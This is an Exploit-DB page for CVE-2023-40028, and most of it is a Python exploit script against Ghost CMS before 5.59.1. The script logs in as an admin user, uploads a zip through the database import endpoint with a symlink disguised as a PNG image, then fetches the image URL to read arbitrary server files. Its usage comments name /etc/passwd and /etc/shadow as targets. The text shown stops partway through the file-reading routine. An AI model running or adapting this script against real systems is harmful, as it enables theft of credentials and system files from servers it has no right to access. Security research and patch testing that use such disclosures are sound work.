---
title: [webapps] Ghost CMS 5.59.1 - Arbitrary File Read
url: https://www.exploit-db.com/exploits/52409
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:47:52.935299
---

# [webapps] Ghost CMS 5.59.1 - Arbitrary File Read

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Ghost CMS 5.59.1 - Arbitrary File Read

#### EDB-ID:

###### 52409

#### CVE:

###### [2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
# Exploit Title: Ghost CMS 5.59.1 - Arbitrary File Read
# Date: 2023-09-20
# Exploit Author: ibrahimsql (https://github.com/ibrahmsql)
# Vendor Homepage: https://ghost.org
# Software Link: https://github.com/TryGhost/Ghost
# Version: < 5.59.1
# Tested on: Ubuntu 20.04 LTS, Windows 10, macOS Big Sur
# CVE: CVE-2023-40028
# Category: Web Application Security
# CVSS Score: 6.5 (Medium)
# Description:
# Ghost CMS versions prior to 5.59.1 contain a vulnerability that allows authenticated users
# to upload files that are symlinks. This can be exploited to perform arbitrary file reads
# of any file on the host operating system. The vulnerability exists in the file upload
# mechanism which improperly validates symlink files, allowing attackers to access files
# outside the intended directory structure through symlink traversal.

# Requirements: requests>=2.28.1, zipfile, tempfile

# Usage Examples:
# python3 CVE-2023-40028.py http://localhost:2368 admin@example.com password123
# python3 CVE-2023-40028.py https://ghost.example.com user@domain.com mypassword

# Interactive Usage:
# After running the script, you can use the interactive shell to read files:
# file> /etc/passwd
# file> /etc/shadow
# file> /var/log/ghost/ghost.log
# file> exit
"""

import requests
import sys
import os
import tempfile
import zipfile
import random
import string
from typing import Optional

class ExploitResult:
    def __init__(self):
        self.success = False
        self.file_content = ""
        self.status_code = 0
        self.description = "Ghost CMS < 5.59.1 allows authenticated users to upload symlink files for arbitrary file read"
        self.severity = "Medium"

class GhostArbitraryFileRead:
    def __init__(self, ghost_url: str, username: str, password: str, verbose: bool = True):
        self.ghost_url = ghost_url.rstrip('/')
        self.username = username
        self.password = password
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        self.api_url = f"{self.ghost_url}/ghost/api/v3/admin"

    def authenticate(self) -> bool:
        """Authenticate with Ghost CMS admin panel"""
        login_data = {
            'username': self.username,
            'password': self.password
        }

        headers = {
            'Origin': self.ghost_url,
            'Accept-Version': 'v3.0',
            'Content-Type': 'application/json'
        }

        try:
            response = self.session.post(
                f"{self.api_url}/session/",
                json=login_data,
                headers=headers,
                timeout=10
            )

            if response.status_code == 201:
                if self.verbose:
                    print("[+] Successfully authenticated with Ghost CMS")
                return True
            else:
                if self.verbose:
                    print(f"[-] Authentication failed: {response.status_code}")
                return False

        except requests.RequestException as e:
            if self.verbose:
                print(f"[-] Authentication error: {e}")
            return False

    def generate_random_name(self, length: int = 13) -> str:
        """Generate random string for image name"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def create_exploit_zip(self, target_file: str) -> Optional[str]:
        """Create exploit zip file with symlink"""
        try:
            # Create temporary directory
            temp_dir = tempfile.mkdtemp()
            exploit_dir = os.path.join(temp_dir, 'exploit')
            images_dir = os.path.join(exploit_dir, 'content', 'images', '2024')
            os.makedirs(images_dir, exist_ok=True)

            # Generate random image name
            image_name = f"{self.generate_random_name()}.png"
            symlink_path = os.path.join(images_dir, image_name)

            # Create symlink to target file
            os.symlink(target_file, symlink_path)

            # Create zip file
            zip_path = os.path.join(temp_dir, 'exploit.zip')
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(exploit_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)

            return zip_path, image_name

        except Exception as e:
            if self.verbose:
                print(f"[-] Error creating exploit zip: {e}")
            return None, None

    def upload_exploit(self, zip_path: str) -> bool:
        """Upload exploit zip file to Ghost CMS"""
        try:
            headers = {
                'X-Ghost-Version': '5.58',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': self.ghost_url,
                'Referer': f"{self.ghost_url}/ghost/"
            }

            with open(zip_path, 'rb') as f:
                files = {
                    'importfile': ('exploit.zip', f, 'application/zip')
                }

                response = self.session.post(
                    f"{self.api_url}/db",
                    files=files,
                    headers=headers,
                    timeout=30
                )

                if response.status_code in [200, 201]:
                    if self.verbose:
                        print("[+] Exploit zip uploaded successfully")
                    return True
                else:
                    if self.verbose:
                        print(f"[-] Upload failed: {response.status_code}")
                    return False

        except requests.RequestException as e:
            if self.verbose:
                print(f"[-] Upload error: {e}")
            return False

    def read_file(self, target_file: str) -> ExploitResult:
        """Read arbitrary file using symlink upload"""
        result = ExploitResult()

        if not self.authenticate():
            return result

        if self.verbose:
            print(f"[*] Attempting to read file: {target_file}")

        # Create exploit zip
        zip_path, image_name = self.create_exploit_zip(target_file)
        if not zip_path:
            return result

        try:
            # Upload exploit
            if self.upload_exploit(zip_path):
                # Try to access the symlinked file
                file_url = f"{self.ghost_url}/content/images/2024/{image_name}"

                response = self.session.get(file_url, timeout=10)

                if response.status_code == 200 and len(response.text) > 0:
                    result.success = True
                    resu...